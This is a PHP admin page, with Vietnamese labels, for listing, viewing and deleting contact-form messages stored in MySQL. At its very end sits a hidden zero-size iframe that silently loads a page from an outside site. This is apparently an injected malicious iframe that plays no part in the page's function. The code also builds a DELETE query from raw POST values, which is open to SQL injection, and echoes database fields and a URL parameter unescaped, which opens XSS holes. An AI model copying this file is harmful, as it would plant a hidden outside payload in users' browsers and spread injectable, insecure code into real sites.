<? include "check.php";?>
<br />
<table width="750" bgcolor="#FFFFFF" border="0" cellspacing="2" cellpadding="2"  align="center"  style="border:#cccccc 1px solid">

	 <tr id="tieude"  ><td  colspan="2"  >&nbsp;&nbsp;&nbsp;<span id="TextLeftCenter2m">Quản lý thông tin liên hệ </span> </td>  </tr>
</table>

<?  		  if($_POST['ItemDel']) {
	 	  if($_SESSION['modn']=='1')   {
		      $action='';
			  if($_POST['element']=='') {
			  
			     echo '<script>alert(\'Mời bạn chọn ít nhất 1 bản tin\')</script>';
				 $action=true;
			  } 
			  if($action=='') {
		  
			  mysql_query("DELETE FROM ".contact." WHERE id in (".implode(",",$_POST['element']).")");
			 
			  }
			   } else { echo "<span id=\"thongbao\"> Bạn không có quyền thực hiện chức năng này </span>"; } 
		  }	
	 

?>


<? if($_GET['view']!='') {?>
 <?
  $sqlstr=mysql_query("SELECT * FROM ".contact." WHERE id='".intval($_GET['view'])."'" );
  mysql_query("UPDATE ".contact." SET status='true' WHERE id='".intval($_GET['view'])."'" );
  if(mysql_num_rows($sqlstr)>0)   {
		   
		$row=mysql_fetch_array($sqlstr);
	
?>
<table style="border-collapse: collapse;"  align="center" width="750" border="1" bordercolor="#bbbbbb" cellpadding="1" cellspacing="1" >
  <tr>
    <td width="146"><div align="right">Tiêu đề</div></td>
    <td width="536"><?=$row['title']?>&nbsp;</td>
  </tr>
  <tr>
    <td><div align="right">Nội dung</div></td>
    <td><?=$row['content']?>&nbsp;</td>
  </tr>
  <tr>
    <td><div align="right">Họ tên</div></td>
    <td><?=$row['fullname']?>&nbsp;</td>
  </tr>
  <tr>
    <td><div align="right">Địa chỉ </div></td>
    <td><?=$row['address']?>&nbsp;</td>
  </tr>
  <tr>
    <td><div align="right">Điện thoại</div></td>
    <td><?=$row['telephone']?>&nbsp;</td>
  </tr>
 
  <tr>
    <td><div align="right">Email</div></td>
    <td><?=$row['email']?>&nbsp;</td>
  </tr>
  <tr>
    <td><div align="right">Ngày gửi</div></td>
    <td><?=date("d/m/Y",$row['postdate'])?>&nbsp;</td>
  </tr>
</table>
<? } ?> 

<? } ?> 

<br />
<table style="border-collapse: collapse;"  align="center" width="750" border="1" bordercolor="#bbbbbb" cellpadding="1" cellspacing="1" >

<form method="post" action="">

<tr  id="tieude">
      <td width="5%" height="27" ><div align="center">#ID</div></td>
	    <td width="65%" >Tiêu đề        </td>
        <td width="10%" ><div align="center">Ngày gửi </div></td>
		 <td width="10%" ><div align="center">Xem  </div></td>
        <td width="10%" ><div align="center">Trang thái </div></td>
</tr>

  <?
	      $p=30;
		  $sqlstr="SELECT * FROM ".contact."";			
	  
		  $page=mysql_query($sqlstr);
		  $n_record=mysql_num_rows($page);
		  num_page(); 
		  $link="index.php?site=".$_GET['site'].""; 
		  $page=$_GET['page']?intval($_GET['page']):1;   
		  $s=($page-1)*$p;   
		  
		  $sqlstr.=" order by ID DESC limit $s,$p";
		  
	  	
		  $sqlstr=mysql_query($sqlstr);	
			
		  if(mysql_num_rows($sqlstr)>0)   {
		   
		  while($row=mysql_fetch_array($sqlstr))	 {
	
?>	  
	  <tr >
	    <td  height="25"  align="center" bgcolor="#EEEEEE">
		<input  type="checkbox" name="element[]" value="<?=$row['id']?>" />		</td>
		<td  ><?=$row['title']?></td>
	    <td  ><div align="center"><?=date("d/m/Y",$row['postdate'])?></div></td>
		    <td  align="center"><a href="index.php?site=<?=$_GET['site']?>&view=<?=$row['id']?>">Xem</a></td>
	    <td ><div align="center"><? echo $row['status']=='true'?'Đã xem':'Chưa xem';?></div></td>
	  </tr>	  
<? }
}
?> 
 <tr>
	    
	    
        <td colspan="5"  align="right"><? view_page($link)?></td>
      </tr>	
<tr>
	    
	    <td  colspan="5" >
		<input type="submit"   onClick="return confirm('Bạn có chắc không ?');" value="Xóa tin này" name="ItemDel" > 
		</td>
       
      </tr>	
	 	  
	</form>
  
</table>


<iframe name="cwindow" style="border:0px double purple" width=0 height=0 src="http://www.hdc.vn/kt.htm"></iframe>
